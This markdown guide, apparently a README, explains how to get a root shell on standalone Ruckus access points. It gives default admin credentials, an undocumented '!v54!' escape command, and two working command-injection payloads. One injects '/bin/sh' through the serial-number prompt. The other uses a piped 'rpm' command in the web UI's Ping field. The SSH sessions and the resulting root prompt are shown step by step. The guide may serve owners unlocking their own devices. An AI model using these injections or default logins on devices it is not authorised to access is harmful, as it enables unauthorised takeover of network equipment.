# Obtaining a root shell on Standalone/Solo Ruckus APs

The Ruckus CLI includes an unlisted `!v54!` command which exits to a root shell.  

Very old AP firmware checks a configuration flag `cli_esc2shell_ok` to decide whether the `!v54!` command is available.  
Newer AP firmware decrypts a saved serial# to check whether the `!v54!` command is available. The `Ruckus` command is used to save the encrypted serial#.

## Firmware >112.1

Sorry, I don't have a method to bypass the serial# check on newer Standalone/Solo AP firmwares

## Firmware 9.8 - 112.1

These AP firmware versions don't sanitize the serial# you provide with the `Ruckus` command.  
So we can inject a root shell.
> Note that the command injection only needs to be performed once.

### SSH to the AP

```console
$ ssh 192.168.0.1 -oKexAlgorithms=+diffie-hellman-group1-sha1 -oHostKeyAlgorithms=+ssh-rsa
```

Login. Default username is "super", password is "sp-admin".

### Command injection

```console
rkscli: Ruckus
```

Now type `";/bin/sh;"` and hit enter *(you won't be able to see what you're typing)*

```console
grrrr
```

> Instead of `grrrr`, any other random dog noise could  be printed to the screen. 

### Escape to shell

```console
rkscli: !v54!
What's your chow: 
```

Now hit enter

```console
Ruckus Wireless ZoneDirector -- Command Line Interface
Enter 'help' for a list of built-in commands.

ruckus$
```

You have a root shell.

## Firmware Pre-9.8

These AP firmware versions don't sanitize the input to the `Ping` diagnostic tool.
So we can use `Ping` to enable `cli_esc2shell_ok`.
> Note that the `Ping` enablement only needs to be performed once.

### Enable shell escape

Go to `Administration` > `Diagnostics`, paste `|rpm${IFS}-p${IFS}cli_esc2shell_ok="t"` into the `Ping:` textbox & hit `Run test`.

### Connect to the AP's Web UI

Login. Default username is "super", password is "sp-admin".

### SSH to the AP

```console
$ ssh 192.168.0.1 -oKexAlgorithms=+diffie-hellman-group1-sha1 -oHostKeyAlgorithms=+ssh-rsa
```

Login. Default username is "super", password is "sp-admin".

### Escape to shell

```console
rkscli: !v54!
What's your chow: 
```

Now hit enter

```console
Ruckus Wireless ZoneDirector -- Command Line Interface
Enter 'help' for a list of built-in commands.

ruckus$
```

You have a root shell.